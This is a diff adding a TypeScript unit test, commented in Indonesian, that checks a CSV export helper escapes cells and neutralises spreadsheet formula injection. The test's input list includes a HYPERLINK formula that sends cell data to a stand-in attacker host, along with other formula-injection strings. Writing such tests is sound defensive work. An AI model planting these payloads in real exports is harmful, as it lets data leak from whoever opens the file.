@@ -775,3 +775,35 @@ test('conversations: subquery terkorelasi memakai nama tabel penuh', async () =>
       `subquery tak mengorelasi ke conversations secara literal:\n${q}`);
   }
 });
+
+test('ekspor CSV: sel diloloskan & rumus dilucuti (CSV injection)', async () => {
+  const { csvCell } = await import('../src/modules/chat/conversation.service');
+
+  // Pelolosan dasar.
+  assert.equal(csvCell('biasa'), 'biasa');
+  assert.equal(csvCell('ada, koma'), '"ada, koma"');
+  assert.equal(csvCell('kutip "di dalam"'), '"kutip ""di dalam"""');
+  assert.equal(csvCell('dua\nbaris'), '"dua\nbaris"');
+  assert.equal(csvCell(undefined as unknown as string), '');
+
+  // CSV INJECTION. Isi percakapan datang dari pengunjung ANONIM. Sel yang
+  // diawali =, +, -, atau @ dieksekusi sebagai RUMUS oleh Excel/Sheets saat
+  // berkasnya dibuka — jalur nyata untuk menarik data keluar lewat berkas yang
+  // tampak tak berbahaya. Awalan kutip tunggal melumpuhkannya.
+  for (const jahat of [
+    '=1+1',
+    '=HYPERLINK("http://penyerang/"&A1,"klik")',
+    '+SUM(A1:A9)',
+    '-2+3',
+    '@SUM(1)',
+    '\tdiawali tab',
+  ]) {
+    const out = csvCell(jahat);
+    assert.ok(out.startsWith("'") || out.startsWith('"\''),
+      `sel berbahaya tak dilumpuhkan: ${jahat} → ${out}`);
+  }
+
+  // Yang dilumpuhkan DAN perlu dikutip harus tetap sah sebagai CSV.
+  const both = csvCell('=CMD("a,b")');
+  assert.ok(both.startsWith('"\'') && both.endsWith('"'), both);
+});
